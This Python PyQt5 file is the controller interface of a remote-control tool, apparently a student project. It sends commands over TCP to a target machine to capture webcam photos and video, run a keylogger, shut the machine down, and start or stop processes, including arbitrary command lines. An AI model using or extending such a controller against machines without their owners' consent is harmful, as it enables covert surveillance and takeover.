# custom_mode.py

import socket
import os
import json
from PyQt5 import QtWidgets
from PyQt5.QtWidgets import QMainWindow, QInputDialog
from custom_mode_ui import Ui_CustomModeWindow

class CustomModeApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.ui = Ui_CustomModeWindow()
        self.ui.setupUi(self)
        self.init_signals()

    def handle_sidebar_change(self, index):
        if index == 6:
            self.hide()

    def init_signals(self):
        if hasattr(self.ui, "btnCapturePhoto"):
            self.ui.btnCapturePhoto.clicked.connect(self.capture_photo)
        if hasattr(self.ui, "btnRecordVideo"):
            self.ui.btnRecordVideo.clicked.connect(self.record_video)
        if hasattr(self.ui, "btnKeyLogger"):
            self.ui.btnKeyLogger.clicked.connect(self.key_logger)
        if hasattr(self.ui, "btnShutdown"):
            self.ui.btnShutdown.clicked.connect(self.shutdown)
        if hasattr(self.ui, "btnRestart"):
            self.ui.btnRestart.clicked.connect(self.restart)
        if hasattr(self.ui, "btnListApps"):
            self.ui.btnListApps.clicked.connect(self.list_apps)
        if hasattr(self.ui, "btnStartApp"):
            self.ui.btnStartApp.clicked.connect(self.start_app)
        if hasattr(self.ui, "btnStopApp"):
            self.ui.btnStopApp.clicked.connect(self.stop_app)
        if hasattr(self.ui, "btnListProcesses"):
            self.ui.btnListProcesses.clicked.connect(self.list_processes)
        if hasattr(self.ui, "btnStartProcess"):
            self.ui.btnStartProcess.clicked.connect(self.start_process)
        if hasattr(self.ui, "btnStopProcess"):
            self.ui.btnStopProcess.clicked.connect(self.stop_process)
        if hasattr(self.ui, "btnGetFile"):
            self.ui.btnGetFile.clicked.connect(self.get_file_content)

    def send_command_to_server(self, command: str, argument: str = None):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                server_ip = self.ui.lineEditServerIP.text().strip()
                if not server_ip:
                    self.append_output("❗Please enter a valid server IP address.")
                    return
                s.connect((server_ip, 12345))

                # Gửi JSON như file cũ
                payload = json.dumps({"command": command, "value": argument})
                s.sendall((payload + '\n').encode("utf-8"))

                result = s.recv(100000).decode("utf-8")
                self.append_output(result)
        except Exception as e:
            self.append_output(f"Error communicating with server: {e}")

    def append_output(self, text: str):
        idx = self.ui.stackedWidget.currentIndex()
        if idx == 0 and hasattr(self.ui, "textOutputSystem"):
            self.ui.textOutputSystem.append(text)
        elif idx == 1 and hasattr(self.ui, "textOutputProcesses"):
            self.ui.textOutputProcesses.append(text)
        elif idx == 2 and hasattr(self.ui, "textOutputApps"):
            self.ui.textOutputApps.append(text)
        elif idx == 3 and hasattr(self.ui, "textOutputFiles"):
            self.ui.textOutputFiles.append(text)
        elif idx == 4 and hasattr(self.ui, "textOutputWebcam"):
            self.ui.textOutputWebcam.append(text)
        elif idx == 5 and hasattr(self.ui, "textOutputKeylogger"):
            self.ui.textOutputKeylogger.append(text)

    def capture_photo(self):
        self.send_command_to_server("capture_photo")

    def record_video(self):
        seconds = self.ui.spinBoxRecordSec.value()
        self.send_command_to_server("record_video", str(seconds))

    def key_logger(self):
        self.send_command_to_server("key_logger")

    def shutdown(self):
        self.send_command_to_server("shutdown")

    def restart(self):
        self.send_command_to_server("restart")

    def list_apps(self):
        self.send_command_to_server("list_apps")

    def start_app(self):
        app_name, ok = QInputDialog.getText(self, "Start App", "Enter app name to start:")
        if ok and app_name.strip():
            self.send_command_to_server("start_app", app_name.strip())

    def stop_app(self):
        app_name, ok = QInputDialog.getText(self, "Stop App", "Enter app name to stop:")
        if ok and app_name.strip():
            self.send_command_to_server("stop_app", app_name.strip())

    def list_processes(self):
        self.send_command_to_server("list_process")

    def start_process(self):
        command, ok = QInputDialog.getText(self, "Start Process", "Enter full command to start process:")
        if ok and command.strip():
            self.send_command_to_server("start_process", command.strip())

    def stop_process(self):
        pid_item = self.ui.tableProcesses.selectedItems()
        if pid_item:
            pid = pid_item[0].text()
            self.send_command_to_server("stop_process", pid)
        else:
            self.append_output("Please select a process in the table to stop.")

    def get_file_content(self):
        path = self.ui.lineEditFilePath.text().strip()
        if not path:
            self.append_output("Please enter a file path.")
            return
        if not os.path.isfile(path):
            self.append_output("File does not exist.")
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
                self.append_output(f"--- Content of {path} ---\n{content}\n--- End of file ---")
        except Exception as e:
            self.append_output(f"Error reading file: {e}")
